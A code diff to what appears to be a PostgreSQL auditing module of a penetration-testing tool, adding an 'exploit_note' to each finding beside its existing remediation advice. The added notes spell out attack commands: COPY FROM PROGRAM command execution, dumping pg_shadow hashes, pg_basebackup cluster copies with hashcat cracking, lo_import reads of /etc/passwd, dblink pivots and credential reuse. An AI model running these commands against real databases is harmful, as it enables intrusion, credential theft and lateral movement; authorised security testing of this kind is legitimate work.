@@ -648,8 +648,10 @@ def postgres_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
-    return _base_finding("psql", sev, title, target, detail, cmd, rem, cwes, kind)
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
+    return _base_finding("psql", sev, title, target, detail, cmd, rem, cwes, kind,
+                         exploit_note=exploit_note, depth_tier=depth_tier)
 
 
 # Back-compat: mysql and mongodb still import _cred_list from postgres.
@@ -687,7 +689,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"psql 'host={h.ip} port={p.portid} user=postgres dbname=postgres'",
                     "Replace `trust` in pg_hba.conf with scram-sha-256 (or md5); bind to "
                     "localhost / a private interface; require TLS for remote access.",
-                    ["CWE-306", "CWE-287"], kind="pg_trust_auth"))
+                    ["CWE-306", "CWE-287"], kind="pg_trust_auth",
+                    exploit_note=(
+                        f"psql 'host={h.ip} port={p.portid} user=postgres'; \\du; "
+                        "SELECT usename,passwd FROM pg_shadow; then CREATE TEMP TABLE r(o text); "
+                        "COPY r FROM PROGRAM 'id'; TABLE r."),
+                    depth_tier="t2"))
                 _rce_finding(out, tgt, h.ip, p.portid, lt, proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
                 _pivot_finding(out, tgt, h.ip, p.portid, lt)
@@ -713,7 +720,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
                         "Set a strong unique password for every Postgres role — never leave "
                         "docker/quick-start defaults on a reachable database.",
-                        ["CWE-521", "CWE-798", "CWE-1392"], kind="pg_default_creds"))
+                        ["CWE-521", "CWE-798", "CWE-1392"], kind="pg_default_creds",
+                        exploit_note=(
+                            f"psql 'host={h.ip} port={p.portid} user=postgres password=postgres'; "
+                            "if superuser, COPY r FROM PROGRAM 'id' — command executes as postgres "
+                            "OS user."),
+                        depth_tier="t2"))
                 else:
                     out.append(_finding(
                         "high", "PostgreSQL credentialed access (looted / weak credential)", tgt,
@@ -723,7 +735,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
                         "Rotate the credential; enforce least privilege; bind to a trusted "
                         "interface; require TLS.",
-                        ["CWE-522", "CWE-284"], kind="pg_cred_access"))
+                        ["CWE-522", "CWE-284"], kind="pg_cred_access",
+                        exploit_note=(
+                            f"psql 'host={h.ip} port={p.portid} user={who} password=<pw>'; "
+                            "SELECT current_setting('is_superuser'); if on -> "
+                            "COPY r FROM PROGRAM 'id'."),
+                        depth_tier="t2"))
                 # Replication-role enumeration — accounts that can pg_basebackup.
                 # Emit a separate high finding listing them by name so the
                 # tester knows which credentials are priority spray targets.
@@ -738,7 +755,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"pg_basebackup -h {h.ip} -p {p.portid} -U <role> -D /tmp/copy",
                         "Rotate passwords on replication roles to strong unique values; "
                         "restrict replication traffic to a private interface via pg_hba.conf.",
-                        ["CWE-798", "CWE-522"], kind="pg_replication_roles"))
+                        ["CWE-798", "CWE-522"], kind="pg_replication_roles",
+                        exploit_note=(
+                            f"For each rep-role: pg_basebackup -h {h.ip} -p {p.portid} "
+                            "-U <role> -D /tmp/copy -X none — if it authenticates, "
+                            "full-cluster dump possible."),
+                        depth_tier="t0"))
                 _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who,
                              proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
@@ -814,7 +836,12 @@ def _replication_finding(out: list, tgt: str, ip: str, port: int,
         "scram-sha-256 with a strong, unique password on every REPLICATION "
         "role; restrict replication to a private interface via `listen_"
         "addresses` and a CIDR-limited pg_hba rule.",
-        ["CWE-306", "CWE-284"], kind="pg_replication_trust"))
+        ["CWE-306", "CWE-284"], kind="pg_replication_trust",
+        exploit_note=(
+            f"pg_basebackup -h {ip} -p {port} -U postgres -D /tmp/dump -X none -P; "
+            "then extract global/pg_authid, crack hashes offline "
+            "(hashcat -m 5433/28600)."),
+        depth_tier="t2"))
 
 
 def _public_schema_finding(out: list, tgt: str, ip: str, port: int,
@@ -843,7 +870,13 @@ def _public_schema_finding(out: list, tgt: str, ip: str, port: int,
             "REVOKE CREATE ON SCHEMA public FROM PUBLIC (recommended by "
             "PostgreSQL 15+ default); require every SECURITY DEFINER function "
             "to `SET search_path`.",
-            ["CWE-732", "CWE-269"], kind="pg_public_create"))
+            ["CWE-732", "CWE-269"], kind="pg_public_create",
+            exploit_note=(
+                "psql -c 'CREATE FUNCTION public.now() RETURNS text AS $$ "
+                "SELECT current_user $$ LANGUAGE sql;' — any SECURITY DEFINER "
+                "caller of now() without SET search_path resolves your version "
+                "first."),
+            depth_tier="t1"))
     sdf = lt.get("security_definer_public") or []
     if sdf:
         sample = ", ".join(f["function"] for f in sdf[:8])
@@ -864,24 +897,39 @@ def _public_schema_finding(out: list, tgt: str, ip: str, port: int,
             "and grant it only to the specific roles that need it; ensure "
             "each definer function starts with `SET search_path = pg_catalog, "
             "public`.",
-            ["CWE-269", "CWE-732"], kind="pg_secdef_public"))
+            ["CWE-269", "CWE-732"], kind="pg_secdef_public",
+            exploit_note=(
+                "psql -c '\\df+ <schema>.<function>' — inspect body for lack of "
+                "SET search_path and vulnerable dynamic SQL; if owner is "
+                "superuser, call it and see whose context runs."),
+            depth_tier="t1"))
 
 
 # Version → CVE map. Keyed by (major, minor) tuple ceiling: a server at or
 # BELOW this tuple is vulnerable. Airgap-safe — no external CVE lookup.
-_PG_CVE_MAP: list[tuple[tuple[int, int], str, str, str]] = [
-    # (major, minor)-inclusive-ceiling, CVE, severity, blurb
+# Each row also carries a tester-facing next-move (`exploit_note`) and its
+# depth tier so the CVE finding it seeds carries them through to the Vuln.
+_PG_CVE_MAP: list[tuple[tuple[int, int], str, str, str, str, str]] = [
+    # (major, minor)-inclusive-ceiling, CVE, severity, blurb, exploit_note, depth_tier
     ((11, 4), "CVE-2019-9193", "critical",
      "COPY FROM PROGRAM was invokable by any role with pg_read_server_files "
      "or pg_execute_server_program membership (or the default_pg_hba any-user "
-     "case) — post-auth RCE without needing superuser."),
+     "case) — post-auth RCE without needing superuser.",
+     "Same as pg_rce: CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; "
+     "TABLE r — see PostgreSQL 11.4 CHANGELOG.",
+     "t0"),
     ((14, 2), "CVE-2022-1552", "high",
      "Autovacuum + REINDEX + CLUSTER on tables the attacker owned ran with "
      "superuser privileges; the attacker could hijack that context to execute "
-     "arbitrary SQL as the superuser."),
+     "arbitrary SQL as the superuser.",
+     "Consult PostgreSQL advisory; on non-superuser-owned tables, plant an "
+     "index expression that fires under REINDEX/CLUSTER to run as superuser.",
+     "t0"),
     ((11, 21), "CVE-2023-5869", "high",
      "Integer overflow in array modification permitted arbitrary memory writes "
-     "as the server user; upgrade to the fixed minor release."),
+     "as the server user; upgrade to the fixed minor release.",
+     "Do NOT run PoC — advise upgrade per CVE-2023-5869 fix.",
+     "t0"),
 ]
 
 
@@ -911,7 +959,7 @@ def _cve_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
     ver = _parse_pg_version(lt.get("server_version", "") if lt else "")
     if not ver:
         return
-    for ceiling, cve, sev, blurb in _PG_CVE_MAP:
+    for ceiling, cve, sev, blurb, exploit_note, tier in _PG_CVE_MAP:
         if ver <= ceiling:
             out.append(_finding(
                 sev, f"PostgreSQL {ver[0]}.{ver[1]} vulnerable to {cve}", tgt,
@@ -919,7 +967,8 @@ def _cve_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
                 f"vulnerable ceiling for {cve}. {blurb}",
                 f"psql 'host={ip} port={port} user=postgres' -c 'SELECT version()'",
                 f"Upgrade to a patched minor release addressing {cve}.",
-                ["CWE-1035"], kind=f"pg_cve_{cve.lower().replace('-', '_')}"))
+                ["CWE-1035"], kind=f"pg_cve_{cve.lower().replace('-', '_')}",
+                exploit_note=exploit_note, depth_tier=tier))
 
 
 def _pivot_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
@@ -956,7 +1005,12 @@ def _pivot_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
         "AS t(u text,p text);\"",
         "Remove dblink/postgres_fdw if unused; restrict outbound network from the DB "
         "host; least-privilege the role; rotate any foreign-server credentials.",
-        ["CWE-441", "CWE-284"], kind="pg_pivot"))
+        ["CWE-441", "CWE-284"], kind="pg_pivot",
+        exploit_note=(
+            "psql -c \"SELECT dblink_connect('h','host=<internal-db> user=postgres "
+            "dbname=postgres'); SELECT * FROM dblink('h','SELECT usename,passwd "
+            "FROM pg_shadow') AS t(u text,p text);\""),
+        depth_tier="t1"))
 
 
 def _emit_lo_file_read(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
@@ -990,7 +1044,12 @@ def _emit_lo_file_read(out: list, tgt: str, ip: str, port: int, lt: dict) -> Non
         "REVOKE SELECT ON pg_largeobject FROM PUBLIC; revoke EXECUTE on "
         "lo_import/lo_export from non-privileged roles; upgrade to a PG "
         "release that ships lo_compat_privileges=off by default.",
-        ["CWE-732", "CWE-284"], kind="pg_lo_file_read"))
+        ["CWE-732", "CWE-284"], kind="pg_lo_file_read",
+        exploit_note=(
+            "psql -c \"SELECT lo_import('/etc/passwd') AS oid;\" then loread "
+            "the returned oid; grep for TLS keys / recovery.conf / pgpass on "
+            "the DB host filesystem."),
+        depth_tier="t1"))
 
 
 def _datamine_finding(out: list, tgt: str, ip: str, port: int, dm: dict | None) -> None:
@@ -1020,7 +1079,12 @@ def _datamine_finding(out: list, tgt: str, ip: str, port: int, dm: dict | None) 
         "\"SELECT * FROM <schema>.<table> LIMIT 20\"   # full data (ROE)",
         "Encrypt sensitive columns at rest; least-privilege the app role; remove "
         "embedded credentials from data; restrict network access.",
-        ["CWE-200", "CWE-312"], kind="pg_datamine"))
+        ["CWE-200", "CWE-312"], kind="pg_datamine",
+        exploit_note=(
+            "psql -c 'SELECT * FROM <schema>.<table> LIMIT 20'; reuse "
+            "harvested URIs against every discovered service via "
+            "nxc/proxychains + mssql/mongo/redis clients."),
+        depth_tier="t3"))
 
 
 def _loot_text(lt: dict) -> str:
@@ -1073,7 +1137,13 @@ def _rce_finding(out: list, tgt: str, ip: str, port: int, lt: dict,
         "-c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
         "Never expose 5432; remove trust auth / rotate creds; run the app as a "
         "non-superuser; revoke pg_execute_server_program.",
-        ["CWE-78", "CWE-306"], kind="pg_rce"))
+        ["CWE-78", "CWE-306"], kind="pg_rce",
+        exploit_note=(
+            f"psql 'host={ip} user={role}' -c \"CREATE TEMP TABLE r(o text); "
+            "COPY r FROM PROGRAM 'id'; TABLE r;\"; expand to full whoami / "
+            "hostname / uname -a; SeImpersonate-equivalent Linux path is "
+            "capsh --print + suid hunt."),
+        depth_tier="t2"))
 
 
 def runbook(ip: str, port: int) -> list[dict]:
